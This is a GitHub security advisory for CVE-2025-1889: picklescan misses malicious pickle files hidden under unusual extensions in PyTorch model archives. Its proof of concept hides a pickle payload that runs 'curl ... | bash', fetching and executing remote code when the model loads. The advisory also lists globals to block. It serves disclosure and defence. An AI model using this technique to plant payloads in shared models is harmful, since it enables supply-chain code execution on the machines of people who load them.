{
    "ghsaId": "GHSA-769v-p64c-89pr",
    "severity": "MODERATE",
    "summary": "PyTorch Model Files Can Bypass Pickle Scanners via Unexpected Pickle Extensions",
    "description": "### CVE-2025-1889\n\n### Summary\n\nPicklescan fails to detect hidden pickle files embedded in PyTorch model archives due to its reliance on file extensions for detection. This allows an attacker to embed a secondary, malicious pickle file with a non-standard extension inside a model archive, which remains undetected by picklescan but is still loaded by PyTorch's torch.load() function. This can lead to arbitrary code execution when the model is loaded.\n\n### Details\n\nPicklescan primarily identifies pickle files by their extensions (e.g., .pkl, .pt). However, PyTorch allows specifying an alternative pickle file inside a model archive using the pickle_file parameter when calling torch.load(). This makes it possible to embed a malicious pickle file (e.g., config.p) inside the model while keeping the primary data.pkl file benign.\n\nA typical attack works as follows:\n\n- A PyTorch model (model.pt) is created and saved normally.\n- A second pickle file (config.p) containing a malicious payload is crafted.\n- The data.pkl file in the model is modified to contain an object that calls torch.load(model.pt, pickle_file='config.p'), causing config.p to be loaded when the model is opened.\n- Since picklescan ignores non-standard extensions, it does not scan config.p, allowing the malicious payload to evade detection.\n- The issue is exacerbated by the fact that PyTorch models are widely shared in ML repositories and organizations, making it a potential supply-chain attack vector.\n\n### PoC\n```\nimport os\nimport pickle\nimport torch\nimport zipfile\nfrom functools import partial\n\nclass RemoteCodeExecution:\n    def __reduce__(self):\n        return os.system, (\"curl -s http://localhost:8080 | bash\",)\n\n# Create a directory inside the model\nos.makedirs(\"model\", exist_ok=True)\n\n# Create a hidden malicious pickle file\nwith open(\"model/config.p\", \"wb\") as f:\n    pickle.dump(RemoteCodeExecution(), f)\n\n# Create a benign model\nmodel = {}\nclass AutoLoad:\n    def __init__(self, path, **kwargs):\n        self.path = path\n        self.kwargs = kwargs\n\n    def __reduce__(self):\n        # Use functools.partial to create a partially applied function\n        # with torch.load and the pickle_file argument\n        return partial(torch.load, self.path, **self.kwargs), ()\n\nmodel['config'] = AutoLoad(model_name, pickle_file='config.p', weights_only=False)\ntorch.save(model, \"model.pt\")\n\n# Inject the second pickle into the model archive\nwith zipfile.ZipFile(\"model.pt\", \"a\") as archive:\n    archive.write(\"model/config.p\", \"model/config.p\")\n\n# Loading the model triggers execution of config.p\ntorch.load(\"model.pt\")\n```\n\n### Impact\n\nSeverity: High\n\nWho is impacted? Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\n\nWhat is the impact? Attackers can embed malicious code in PyTorch models that remains undetected but executes when the model is loaded.\n\nPotential Exploits: This vulnerability could be exploited in supply chain attacks, backdooring pre-trained models distributed via repositories like Hugging Face or PyTorch Hub.\n\n### Recommendations\n\n1. Scan All Files in the ZIP Archive: picklescan should analyze all files in the archive instead of relying on file extensions.\n2. Detect Hidden Pickle References: Static analysis should detect torch.load(pickle_file=...) calls inside data.pkl.\n3. Magic Byte Detection: Instead of relying on extensions, picklescan should inspect file contents for pickle magic bytes (\\x80\\x05).\n4. Block the following globals:\n        - torch.load\n        - Block functools.partial",
    "permalink": "https://github.com/advisories/GHSA-769v-p64c-89pr",
    "publishedAt": "2025-03-03T19:59:46Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-769v-p64c-89pr"
        },
        {
            "type": "CVE",
            "value": "CVE-2025-1889"
        }
    ]
}